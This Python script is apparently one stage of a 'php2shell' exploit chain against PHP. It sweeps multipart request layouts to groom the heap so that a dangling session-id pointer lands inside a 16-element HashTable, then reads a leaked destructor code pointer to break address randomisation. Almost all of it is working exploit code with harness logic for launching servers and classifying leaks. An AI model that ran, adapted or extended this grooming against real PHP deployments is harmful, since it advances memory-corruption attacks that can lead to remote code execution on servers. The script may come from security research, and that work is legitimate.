#!/usr/bin/env python3
"""Occupancy sweep: on a *stable* stale pad, try to make a 16-element array's
HashTable struct land 0x10 bytes before the dangling PS(id) pointer.

Why this experiment and not another fit sweep
---------------------------------------------
step4_fitsweep.py established a reproducible landing pad: 22 of 32
configurations produce a stale read deterministically across three runs.
That pad is the prerequisite for grooming - you cannot steer an allocation
onto a chunk that only sometimes exists.

The step-4 win condition is a layout fact, not a payload fact:

    PS(id) == address(HashTable) + 0x10
    => *(u64*)(PS(id)+0x10) == HT+0x20 == nTableSize      == 16
    => *(u64*)(PS(id)+0x18) == HT+0x28 == nNextFreeElement == 16
    => *(u64*)(PS(id)+0x20) == HT+0x30 == pDestructor      == code pointer

So the 16-byte cookie read is {nNextFreeElement, pDestructor}, and a win needs
the dangling pointer to sit exactly 0x10 into a live 16-element HashTable.

This sweep holds the pad fixed (producer PHPSESSID = NUL, consumer id = 24 'a')
and varies only the consumer array geometry: how many scalar fields precede the
array, where the 16-element array sits, its element size, and how many arrays
there are. Each configuration is run twice (the pad is stable, so agreement is
the default; disagreement is reported as flaky).

Every stale read is decoded as eight 8-byte little-endian words so a HashTable
shape can be recognised by inspection, not only by the exact win test.
"""
import fcntl
import os
import struct
import sys
import time
import traceback

sys.path[:0] = ["/opt/data/php2shell-lab", "/opt/data/lab-scratch"]
import stage2 as S2                      # noqa: E402
import step4_reach as R                  # noqa: E402
import step4_fitsweep as F               # noqa: E402

OUT = "/opt/data/lab-scratch/occupy.log"
EVID = "/opt/data/lab-scratch/occupy-logs"
DTOR_LOW21 = 0x112930
PGEO = dict(F.PGEO)                      # depth=58, count=935, field_count=65, value_size=39
PRODUCER_ID = b"\x00"                    # P-NUL: the stable pad
CONSUMER_ID = b"a" * 24                  # C-24


def words(dump, n=8):
    out = []
    for i in range(n):
        chunk = dump[i * 8:(i + 1) * 8]
        if len(chunk) < 8:
            break
        out.append("%#x" % int.from_bytes(chunk, "little"))
    return " ".join(out)


def verdict(rec):
    """Return (label, detail) for one probe record."""
    b, n = rec["dump"], rec["len"]
    if n == 32 and len(b) >= 32 and all(chr(c) in "0123456789abcdef" for c in b[:32]):
        return "healthy-id", ""
    if n == 16 and len(b) >= 16:
        first = int.from_bytes(b[0:8], "little")
        second = int.from_bytes(b[8:16], "little")
        detail = "w0=%#x w1=%#x w2=%#x" % (first, second,
                                           int.from_bytes(b[16:24], "little")
                                           if len(b) >= 24 else 0)
        if first == 16 and (second & 0x1FFFFF) == DTOR_LOW21:
            return "*** CODE-POINTER %#x ***" % second, detail
        return "len16 first=%d low21=%#x" % (first, second & 0x1FFFFF), detail
    if len(b) >= 32:
        return "stale len=%d" % n, "w0=%s" % words(b)
    return "stale len=%d" % n, ("w0=%s" % words(b)) if b else ""


def consumer2(id_value, fields, array_at, array_len, array_value, value_size,
              arrays=1, filler_value_size=None):
    """Consumer body with an explicit array geometry.

    `arrays` places that many multi-element arrays contiguously starting at
    array_at. Part indices run 0..983-fields-1, so callers must keep the range
    in bounds (the fitsweep default is fields=73, array_at=69).
    """
    filler_value_size = filler_value_size or value_size
    parts = [F.part(b"PHPSESSID", id_value), F.part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(fields):
        parts.append(F.part(("s%04d" % i).encode(), b"P" * filler_value_size))
    total = 983 - fields
    targets = set(range(array_at, array_at + arrays)) & set(range(total))
    for i in range(total):
        if i in targets:
            for j in range(array_len):
                parts.append(F.part(("a%04d[%d]" % (i, j)).encode(), b"x" * array_value))
        else:
            parts.append(F.part(("a%04d[0]" % i).encode(), b"x" * array_value))
    return S2.body(parts)


def run_one(idx, tag, cbytes):
    """One config: fresh server, producer (must OOM), consumer, probes."""
    port = 19900 + (idx % 380)
    srv = None
    try:
        srv = R.start_server(port)
        prod_raw = S2.send(port, F.producer(PGEO, PRODUCER_ID), cookies=S2.COOKIE_PAIRS)
        _, ptags = S2.classify(prod_raw)
        if "OOM" not in " ".join(str(t) for t in ptags):
            return None, "PRODUCER DID NOT OOM tags=%s" % (ptags,), ""
        n_before = len(F.probe_reads(R.LOG))
        try:
            cons_raw = S2.send(port, cbytes)
        except OSError as exc:
            return None, "consumer raised %s" % exc, ""
        sid = S2.session_id(cons_raw) if cons_raw else None
        time.sleep(0.3)
        new = F.probe_reads(R.LOG)[n_before:]
        with open(os.path.join(EVID, "%03d-%s.log" % (idx, tag)), "wb") as fh:
            fh.write(open(R.LOG, "rb").read())
        pick = [r for r in new if r["site"] == "A0"] or [r for r in new if r["site"] == "A"]
        drec = [r for r in new if r["site"] == "D"]
        if not pick:
            return None, "NO PS(id) DEREF", "wire=" + F.wire_verdict(sid)
        r = pick[-1]
        label, detail = verdict(r)
        extra = "addr=%#x send_cookie=%d headers=%d %s D:%s" % (
            r["addr"], r.get("send_cookie", -1), r.get("headers_sent", -1), detail,
            "len=%d" % drec[-1]["len"] if drec else "none")
        return r, label, "wire=" + F.wire_verdict(sid) + " " + extra
    finally:
        if srv is not None:
            R.stop_server(srv)


def log(msg):
    print(msg, flush=True)
    with open(OUT, "a") as fh:
        fh.write(msg + "\n")


def configs():
    """A 16-element array's HashTable struct is 56 B and its arData 256 B.

    The knobs are how much allocation happens before the array (fields) and
    where the array sits in the multipart part order. Near the end of the body
    means allocated last, closest to the freed id chunk. Part indices are
    0..983-fields-1, so the "end" position is 983-fields-1, not 983-fields.
    """
    out = []
    # baseline: the fitsweep config already known to read stale deterministically
    out.append(("pad-baseline-f73-a69-l16-v16", dict(fields=73, array_at=69,
                                                    array_len=16, array_value=16, value_size=24)))
    # array at the very end of the part list, varying how many scalars precede
    for fields in (0, 8, 16, 32, 48, 64, 72):
        total = 983 - fields
        out.append(("end-f%d-l16-v16" % fields, dict(fields=fields, array_at=total - 1,
                                                     array_len=16, array_value=16, value_size=16)))
    # array adjacent to the id part (earliest possible), varying field count after
    for fields in (0, 16, 32):
        out.append(("front-f%d-l16-v16" % fields, dict(fields=fields, array_at=0,
                                                      array_len=16, array_value=16, value_size=16)))
    # element size sweep at the tail position
    for av in (8, 16, 24, 32, 40, 56, 64):
        total = 983 - 64
        out.append(("end-f64-l16-v%d" % av, dict(fields=64, array_at=total - 1,
                                                array_len=16, array_value=av, value_size=24)))
    # array length sweep (a 16-element array has nTableSize 16; 8/32 test the fit)
    for al in (8, 16, 32):
        total = 983 - 64
        out.append(("end-f64-l%d-v16" % al, dict(fields=64, array_at=total - 1,
                                                array_len=al, array_value=16, value_size=16)))
    # repeated arrays to churn the same size class several times
    for n in (2, 4, 8):
        total = 983 - 64
        out.append(("end-f64-x%d-l16-v16" % n, dict(fields=64, array_at=total - n,
                                                   array_len=16, array_value=16, value_size=16,
                                                   arrays=n)))
    # scalar value size sweep (moves the 56 B/256 B class pressure)
    for vs in (8, 16, 24, 40):
        total = 983 - 64
        out.append(("end-f64-l16-v16-s%d" % vs, dict(fields=64, array_at=total - 1,
                                                    array_len=16, array_value=16, value_size=vs)))
    return out


def main():
    fh = open("/opt/data/lab-scratch/occupy.lock", "w")
    try:
        fcntl.flock(fh, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        print("another occupy instance holds the lock; refusing", flush=True)
        return 2
    fh.write("pid=%d\n" % os.getpid())
    fh.flush()
    os.makedirs(EVID, exist_ok=True)
    open(OUT, "a").write("\n=== occupy start %s pid=%d ===\n"
                         % (time.strftime("%Y-%m-%d %H:%M:%S"), os.getpid()))
    cfgs = configs()
    if "--smoke" in sys.argv:
        cfgs = cfgs[:1]
    idx = 0
    wins, stale, valid, flaky = [], [], 0, []
    for tag, kw in cfgs:
        idx += 1
        cbytes = consumer2(CONSUMER_ID, **kw)
        try:
            rec, label, extra = run_one(idx, tag, cbytes)
        except Exception:
            log("  %-26s : EXCEPTION\n%s" % (tag, traceback.format_exc()))
            continue
        if rec is None:
            log("  %-26s : INVALID %s" % (tag, label))
            continue
        valid += 1
        line = "  %-26s : probeA=%-30s %s" % (tag, label, extra)
        if "CODE-POINTER" in label:
            wins.append(tag)
        if label != "healthy-id":
            stale.append(tag)
            idx += 1
            try:
                _, label2, _ = run_one(idx, tag + "-rerun", cbytes)
            except Exception:
                label2 = "EXC"
            line += "  [rerun=%s]" % (label2,)
            if label2 != label:
                flaky.append(tag)
        log(line)
    log("\n=== occupy done %s  configs=%d valid=%d stale=%d wins=%d flaky=%d ==="
        % (time.strftime("%Y-%m-%d %H:%M:%S"), idx, valid, len(stale), len(wins), len(flaky)))
    if stale:
        log("  stale: " + ", ".join(stale))
    if flaky:
        log("  flaky: " + ", ".join(flaky))
    for w in wins:
        log("  *** WIN %s ***" % w)
    return 0


if __name__ == "__main__":
    sys.exit(main())
